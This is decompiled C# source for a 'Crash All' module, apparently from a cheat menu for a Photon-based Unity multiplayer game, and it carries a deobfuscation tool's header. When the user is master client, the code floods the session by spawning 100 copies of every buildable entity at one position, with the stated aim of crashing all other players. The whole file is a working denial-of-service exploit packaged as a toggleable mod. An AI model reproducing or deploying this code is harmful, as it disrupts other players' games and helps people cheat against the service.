// Processed with MiDeobf Engine v2.1.2rc (14/08/26)
// discord.gg/wyvern
// https://wyvern.im

// Type: Recovered.Obfuscated.CrashAll
// Assembly: Rexon_Menu, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null

using System.Collections.Generic;
using Photon.Pun;
using Rexon_Menu.Core.Attributes;
using UnityEngine;

namespace Recovered.Obfuscated;

[Mod("Crash All", "Super Infection/Casual [MASTERCLIENT]", "Crashes all players.", true, 30, ModType.Toggle, false)]
internal class CrashAll : MonoBehaviour
{

	private void OnEnable()
	{
		if (!PhotonNetwork.InRoom || !GameNetworkUtilities.IsSuperInfectionMode() || !PhotonNetwork.IsMasterClient)
		{
			Object.Destroy(this);
			return;
		}
		GameNetworkUtilities.CacheGameEntityTypeIds();
		Vector3 spawnPosition = new Vector3(-61.9586f, 230.2118f, -61.7674f);
		List<GameEntityCreateData> entities = new List<GameEntityCreateData>();
		foreach (string entityName in GameNetworkUtilities.BuildableEntityNames)
		{
			if (GameNetworkUtilities.EntityTypeIdsByName.TryGetValue(entityName, out int entityTypeId))
			{
				for (int copyIndex = 0; copyIndex < 100; copyIndex++)
				{
					entities.Add(new GameEntityCreateData
					{
						entityTypeId = entityTypeId,
						position = spawnPosition,
						rotation = Quaternion.LookRotation(Vector3.down),
						createData = 0L
					});
				}
			}
		}
		GameNetworkUtilities.SpawnGameEntities(entities, null, destroyAfterCreation: true);
		Object.Destroy(this);
	}
}
